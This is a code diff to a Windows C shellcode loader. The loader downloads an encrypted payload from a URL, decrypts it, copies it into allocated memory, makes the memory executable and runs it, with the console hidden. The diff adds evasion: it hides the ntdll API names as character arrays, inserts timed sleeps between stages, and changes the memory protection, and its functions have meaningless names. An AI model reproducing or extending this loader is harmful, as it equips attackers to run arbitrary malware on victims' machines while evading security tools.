@@ -33,11 +33,17 @@ typedef NTSTATUS(WINAPI* PNTPROTECTVIRTUALMEMORY)(
     PULONG OldProtect
 );
 
+unsigned char HvqNFK[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
+unsigned char sQKsNqz[] = { 'N', 't', 'D', 'e', 'l', 'a', 'y', 'E', 'x', 'e', 'c', 'u', 't', 'i', 'o', 'n', 0x0 };
+unsigned char fRuXH[] = { 'N', 't', 'D', 'e', 'l', 'a', 'y', 'E', 'x', 'e', 'c', 'u', 't', 'i', 'o', 'n', 0x0 };
+unsigned char UHVQNq[] = { 'Z', 'w', 'S', 'e', 't', 'T', 'i', 'm', 'e', 'r', 'R', 'e', 's', 'o', 'l', 'u', 't', 'i', 'o', 'n', 0x0 };
+
+
 static NTSTATUS(__stdcall* NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) =
-    (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER))GetProcAddress(GetModuleHandle("ntdll.dll"), "NtDelayExecution");
+    (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER))GetProcAddress(GetModuleHandle(HvqNFK), sQKsNqz);
 
 static NTSTATUS(__stdcall* ZwSetTimerResolution)(IN ULONG RequestedResolution, IN BOOLEAN Set, OUT PULONG ActualResolution) =
-    (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG))GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwSetTimerResolution");
+    (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG))GetProcAddress(GetModuleHandle(HvqNFK), UHVQNq);
 
 static void Random4(float milliseconds) {
     static bool once = true;
@@ -53,7 +59,7 @@ static void Random4(float milliseconds) {
 }
 
 PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory =
-    (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
+    (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA(HvqNFK), "NtAllocateVirtualMemory");
 
 BOOL Random3(LPCWSTR szUrl, PBYTE* RandomB, SIZE_T* pBufferSize) {
     BOOL bSuccess = TRUE;
@@ -174,7 +180,7 @@ int main() {
     SIZE_T RandomBSize = 0;
 
     FreeConsole();
-
+    Random4(3500);
     // Download the payload
     if (!Random3(szUrl, &RandomB, &RandomBSize)) {
         printf("[!] Random3 Failed\n");
@@ -183,7 +189,7 @@ int main() {
 
     // Decrypt payload
     Random1((char*)RandomB, RandomBSize, Random2, sizeof(Random2));
-
+    Random4(3500);
     // Allocate Virtual Memory
     void* exec = NULL;
     SIZE_T size = RandomBSize;
@@ -195,27 +201,26 @@ int main() {
         MEM_COMMIT | MEM_RESERVE,
         PAGE_READWRITE
     );
-    
+    Random4(3500);
     // Copy shellcode into allocated memory
     memcpy(exec, RandomB, RandomBSize);
-
+    Random4(3200);
     // Change the memory protection to RX (Read and Execute)
     DWORD oldProtect;
-   
-if (VirtualProtect(exec, size, PAGE_EXECUTE_READ, &oldProtect) == 0) {
+   Random4(3100);
+if (VirtualProtect(exec, size, PAGE_EXECUTE, &oldProtect) == 0) {
     // Handle error if needed
     return -1;
 }
-
+    Random4(2000);
     // Execute shellcode in memory
     ((void(*)())exec)();
-
+    Random4(2300);
     // Free the allocated memory using NtFreeVirtualMemory
     PNTFREEVIRTUALMEMORY NtFreeVirtualMemory =
-        (PNTFREEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory");
+        (PNTFREEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA(HvqNFK), "NtFreeVirtualMemory");
     SIZE_T regionSize = 0;
     status = NtFreeVirtualMemory(GetCurrentProcess(), &exec, &regionSize, MEM_RELEASE);
 
     return 0;
 }
-
